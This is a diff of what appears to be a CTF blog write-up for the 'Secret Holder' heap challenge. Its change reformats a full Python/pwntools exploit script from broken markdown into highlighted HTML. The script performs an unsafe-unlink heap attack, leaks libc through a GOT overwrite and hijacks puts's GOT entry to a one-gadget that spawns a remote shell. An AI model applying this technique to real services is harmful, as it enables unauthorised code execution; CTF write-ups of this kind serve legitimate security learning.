@@ -336,117 +336,116 @@ Program allow us to:</p>
 
 <p>After that we’re able to overwrite some GOT and hijack the control flow. Here I overwrite <code class="highlighter-rouge">puts</code>’s GOT into the address of the <a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf">one-gadget</a>, which will make the program spawn a shell whenever it tries to call <code class="highlighter-rouge">puts</code> to print out some message.</p>
 
-<p>```python exp_secret.py
-#!/usr/bin/env python</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “52.68.31.117”
-PORT = 5566
-ELF_PATH = “./secret_holder_noalarm”
-LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"52.68.31.117"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">5566</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./secret_holder_noalarm"</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span>
 
-<h1 id="setting">setting</h1>
-<p>context.arch = ‘amd64’
-context.os = ‘linux’
-context.endian = ‘little’
-context.word_size = 32</p>
-<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
-<p>context.log_level = ‘INFO’</p>
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
-<p>elf = ELF(ELF_PATH)
-libc = ELF(LIBC_PATH)</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 
-<p>def my_recvuntil(s, delim):
-    res = “”
-    while delim not in res:
-        c = s.recv(1)
-        res += c
-        sys.stdout.write(c)
-        sys.stdout.flush()
-    return res</p>
+<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span>
 
-<p>def myexec(cmd):
-    return subprocess.check_output(cmd, shell=True)</p>
+<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-<p>def keep(ch, secret):
-    r.sendlineafter(“3. Renew secret\n”, “1”)
-    r.sendlineafter(“3. Huge secret\n”, str(ch))
-    r.sendafter(“secret: \n”, secret)</p>
+<span class="k">def</span> <span class="nf">keep</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="n">secret</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"3. Renew secret</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"3. Huge secret</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"secret: </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
 
-<p>def wipe(ch):
-    r.sendlineafter(“3. Renew secret\n”, “2”)
-    r.sendlineafter(“3. Huge secret\n”, str(ch))</p>
+<span class="k">def</span> <span class="nf">wipe</span><span class="p">(</span><span class="n">ch</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"3. Renew secret</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"3. Huge secret</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
 
-<p>def renew(ch, secret):
-    r.sendlineafter(“3. Renew secret\n”, “3”)
-    r.sendlineafter(“3. Huge secret\n”, str(ch))
-    r.sendafter(“secret: \n”, secret)</p>
+<span class="k">def</span> <span class="nf">renew</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="n">secret</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"3. Renew secret</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"3. Huge secret</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"secret: </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
-#r = process(ELF_PATH)
-keep(1, "A"*8)
-keep(2, "A"*8)
-keep(3, "A"*8)
-wipe(1)
-wipe(2)
-wipe(3)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
+    <span class="n">keep</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">keep</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">keep</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">wipe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">wipe</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">wipe</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
 
-keep(3, "3"*8) # now huge chunk will use malloc, not mmap!!
-wipe(1)
-keep(1, "A"*8) # now huge = small
-keep(2, "2"*8) # big will adjacent to the end of the small buffer
+    <span class="n">keep</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"3"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># now huge chunk will use malloc, not mmap!!</span>
+    <span class="n">wipe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">keep</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># now huge = small</span>
+    <span class="n">keep</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"2"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># big will adjacent to the end of the small buffer</span>
 
-# 0x6020a8 stores the huge buffer's address
-fake_fd = 0x6020a8 - 0x18
-fake_bk = 0x6020a8 - 0x10
+    <span class="c"># 0x6020a8 stores the huge buffer's address</span>
+    <span class="n">fake_fd</span> <span class="o">=</span> <span class="mh">0x6020a8</span> <span class="o">-</span> <span class="mh">0x18</span>
+    <span class="n">fake_bk</span> <span class="o">=</span> <span class="mh">0x6020a8</span> <span class="o">-</span> <span class="mh">0x10</span>
 
-# overwrite big's chunk data with fake chunk data for unsafe unlink
-payload = p64(0) + p64(0x21) # fake prev_chunk header
-payload += p64(fake_fd) + p64(fake_bk) # fake fd and bk
-payload += p64(0x20) + p64(0x90) # we are going to free here
-payload += "B"*0x80
-payload += p64(0x90) + p64(0x91) # fake next_chunk header
-payload += "C"*0x80
-payload += p64(0x90) + p64(0x91) # fake next_next_chunk header
-renew(3, payload)
+    <span class="c"># overwrite big's chunk data with fake chunk data for unsafe unlink</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c"># fake prev_chunk header</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_bk</span><span class="p">)</span> <span class="c"># fake fd and bk</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="c"># we are going to free here</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x80</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="c"># fake next_chunk header</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x80</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="c"># fake next_next_chunk header</span>
+    <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    
+    <span class="n">wipe</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c"># free big, trigger unsafe unlink</span>
 
-wipe(2) # free big, trigger unsafe unlink
+    <span class="c"># now huge_buf will point to global data section</span>
+    <span class="c"># renew huge, overwrite small, big &amp; huge buffer address</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020b0</span><span class="p">)</span> <span class="c"># &amp;small_buf</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">])</span>
+    <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    
+    <span class="n">renew</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]))</span> <span class="c"># make free(buf) = puts(buf)</span>
+    
+    <span class="c"># make small_buf = libc_start_main got</span>
+    <span class="c"># wipe(small) = puts(small) = puts(got) = leak address</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+    <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">wipe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
+    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4525a</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"one_gadget: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
 
-# now huge_buf will point to global data section
-# renew huge, overwrite small, big &amp; huge buffer address
-payload = "A"*0x10
-payload += p64(0)
-payload += p64(0x6020b0) # &amp;small_buf
-payload += p64(elf.got['free'])
-renew(3, payload)
+    <span class="c"># hijack puts@got.plt, make it jump to one_gadget</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+    <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">renew</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
 
-renew(1, p64(elf.plt['puts'])) # make free(buf) = puts(buf)
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
-# make small_buf = libc_start_main got
-# wipe(small) = puts(small) = puts(got) = leak address
-payload = p64(elf.got['__libc_start_main']) + p32(1)*3
-renew(3, payload)
-wipe(1)
-libc.address += u64(r.recvline().strip().ljust(8, "\x00")) - libc.symbols['__libc_start_main']
-one_gadget = libc.address + 0x4525a
-log.success("libc_base: "+hex(libc.address))
-log.success("one_gadget: "+hex(one_gadget))
 
-# hijack puts@got.plt, make it jump to one_gadget
-payload = p64(elf.got['puts']) + p32(1)*3
-renew(3, payload)
-renew(1, p64(one_gadget))
-
-r.interactive()
 </code></pre></div></div>
-
-<p>```</p>
 
 <p>Such a shame that I didn’t solve this challenge …… I might be able to solve it if I did some more fuzzing…..</p>
 
